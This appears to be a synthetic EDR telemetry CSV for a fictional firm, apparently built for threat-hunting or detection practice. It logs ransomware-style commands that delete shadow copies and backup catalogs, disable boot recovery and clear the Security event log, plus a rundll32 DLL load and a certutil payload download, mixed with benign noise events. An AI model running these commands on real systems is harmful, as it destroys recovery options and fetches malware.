event.time,event.type,endpoint.name,site.name,src.process.storyline.id,src.process.uid,src.process.pid,src.process.name,src.process.cmdline,src.process.image.path,src.process.image.sha256,src.process.publisher,src.process.verifiedStatus,src.process.user,src.process.parent.pid,src.process.parent.name,src.process.parent.cmdline,src.process.parent.uid,tgt.file.path,tgt.file.sha256,tgt.process.name,tgt.process.pid,src.ip.address,src.port.number,dst.ip.address,dst.port.number,event.network.protocolName,dns.request,dns.response,registry.keyPath,registry.value,module.path,module.sha1
2026-04-15T14:12:30.402Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-vss,7240,vssadmin.exe,vssadmin.exe delete shadows /all /quiet,C:\Windows\System32\vssadmin.exe,1111aaaa2222bbbb3333cccc4444dddd,Microsoft Windows,signed,NT AUTHORITY\SYSTEM,7012,svchost.exe,C:\Users\jdoe\AppData\Roaming\svchost.exe,uid-stage2,,,,,,,,,,,,,,
2026-04-15T14:12:31.999Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-bcd,7256,bcdedit.exe,"bcdedit.exe /set {default} recoveryenabled no",C:\Windows\System32\bcdedit.exe,2222bbbb3333cccc4444dddd5555eeee,Microsoft Windows,signed,NT AUTHORITY\SYSTEM,7012,svchost.exe,,uid-stage2,,,,,,,,,,,,,,
2026-04-15T14:12:33.117Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-wbadmin,7288,wbadmin.exe,wbadmin.exe delete catalog -quiet,C:\Windows\System32\wbadmin.exe,3333cccc4444dddd5555eeee6666ffff,Microsoft Windows,signed,NT AUTHORITY\SYSTEM,7012,svchost.exe,,uid-stage2,,,,,,,,,,,,,,
2026-04-15T14:12:40.009Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-wevtutil,7301,wevtutil.exe,wevtutil.exe cl Security,C:\Windows\System32\wevtutil.exe,4444dddd5555eeee6666ffff7777aaaa,Microsoft Windows,signed,NT AUTHORITY\SYSTEM,7012,svchost.exe,,uid-stage2,,,,,,,,,,,,,,
2026-04-15T14:13:01.555Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-rundll-credui,7444,rundll32.exe,"rundll32.exe C:\Users\jdoe\AppData\Local\Temp\m.dll,Start",C:\Windows\System32\rundll32.exe,5555eeee6666ffff7777aaaa8888bbbb,Microsoft Windows,signed,GARLAND\jdoe,7012,svchost.exe,,uid-stage2,,,,,,,,,,,,,,
2026-04-15T14:13:02.017Z,Module Load,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-rundll-credui,7444,rundll32.exe,"rundll32.exe C:\Users\jdoe\AppData\Local\Temp\m.dll,Start",C:\Windows\System32\rundll32.exe,5555eeee6666ffff7777aaaa8888bbbb,Microsoft Windows,signed,GARLAND\jdoe,7012,svchost.exe,,uid-stage2,,,,,,,,,,,,,C:\Users\jdoe\AppData\Local\Temp\m.dll,9999aaaa1111bbbb2222cccc3333dddd
2026-04-15T14:14:11.823Z,IP Connect,WS-DESIGN-02,GarlandSales,storyline-bbb-002,uid-chrome,2218,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",C:\Program Files\Google\Chrome\Application\chrome.exe,8888aaaa9999bbbb1111cccc2222dddd,Google LLC,signed,GARLAND\msmith,1024,explorer.exe,,uid-explorer-2,,,,,10.10.20.78,52341,142.250.80.46,443,TCP,,,,,,
2026-04-15T14:14:12.998Z,DNS Resolved,WS-DESIGN-02,GarlandSales,storyline-bbb-002,uid-chrome,2218,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",C:\Program Files\Google\Chrome\Application\chrome.exe,8888aaaa9999bbbb1111cccc2222dddd,Google LLC,signed,GARLAND\msmith,1024,explorer.exe,,uid-explorer-2,,,,,,,,,,www.google.com,142.250.80.46,,,,
2026-04-15T14:15:02.117Z,Process Creation,WS-DESIGN-02,GarlandSales,storyline-noise-001,uid-sentinel-1,1011,SentinelAgent.exe,"""C:\Program Files\SentinelOne\Sentinel Agent 23.4.1.124\SentinelAgent.exe""",C:\Program Files\SentinelOne\Sentinel Agent 23.4.1.124\SentinelAgent.exe,9999bbbb2222cccc3333dddd4444eeee,SentinelOne Inc,signed,NT AUTHORITY\SYSTEM,4,services.exe,,uid-services,,,,,,,,,,,,,,
2026-04-15T14:15:03.221Z,Process Creation,WS-DESIGN-02,GarlandSales,storyline-noise-001,uid-svchost-1,872,svchost.exe,"C:\Windows\system32\svchost.exe -k netsvcs -p",C:\Windows\System32\svchost.exe,1111ffff2222aaaa3333bbbb4444cccc,Microsoft Windows,signed,NT AUTHORITY\SYSTEM,4,services.exe,,uid-services,,,,,,,,,,,,,,
2026-04-15T14:15:04.881Z,Process Creation,WS-DESIGN-02,GarlandSales,storyline-noise-001,uid-ninja-1,3441,NinjaRMMAgent.exe,"""C:\Program Files (x86)\NinjaRMMAgent\NinjaRMMAgent.exe""",C:\Program Files (x86)\NinjaRMMAgent\NinjaRMMAgent.exe,2222ffff3333aaaa4444bbbb5555cccc,NinjaOne LLC,signed,NT AUTHORITY\SYSTEM,4,services.exe,,uid-services,,,,,,,,,,,,,,
2026-04-15T14:16:42.013Z,Process Creation,WS-FINANCE-01,GarlandSales,storyline-ccc-003,uid-certutil,9112,certutil.exe,"certutil.exe -urlcache -split -f http://192.168.55.10/payload.txt C:\Users\Public\p.txt",C:\Windows\System32\certutil.exe,3333eeee4444ffff5555aaaa6666bbbb,Microsoft Windows,signed,GARLAND\acook,8888,cmd.exe,cmd.exe,uid-cmd-fin,,,,,,,,,,,,,,
2026-04-15T14:17:01.118Z,File Creation,WS-FINANCE-01,GarlandSales,storyline-ccc-003,uid-certutil,9112,certutil.exe,"certutil.exe -urlcache -split -f http://192.168.55.10/payload.txt C:\Users\Public\p.txt",C:\Windows\System32\certutil.exe,3333eeee4444ffff5555aaaa6666bbbb,Microsoft Windows,signed,GARLAND\acook,8888,cmd.exe,,uid-cmd-fin,C:\Users\Public\p.txt,4444aaaa5555bbbb6666cccc7777dddd,,,,,,,,,,,,
